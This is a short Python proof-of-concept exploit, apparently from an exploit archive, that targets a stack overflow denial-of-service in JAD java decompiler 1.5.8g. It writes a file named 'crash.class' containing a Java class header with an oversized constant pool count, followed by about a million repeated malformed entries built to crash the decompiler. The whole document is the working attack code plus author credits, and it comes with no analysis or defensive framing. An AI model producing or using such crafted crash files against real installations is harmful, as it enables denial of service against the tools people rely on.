#!/usr/bin/env python
#JAD java decompiler 1.5.8g (.class) Stack Overflow DoS
#Tested on Windows
#Software Link: http://www.varaneckas.com/jad
#Author: l3D
#Site: http://xraysecurity.blogspot.com
#IRC: irc://irc.nix.co.il
#Email: pupipup33@gmail.com

header='\xca\xfe\xba\xbe\x01\x04\x01\x04\xff\xff'
evil='\x07\x01\x01'*0x100000
bad=open('crash.class', 'w')
bad.write(header+evil)
bad.close()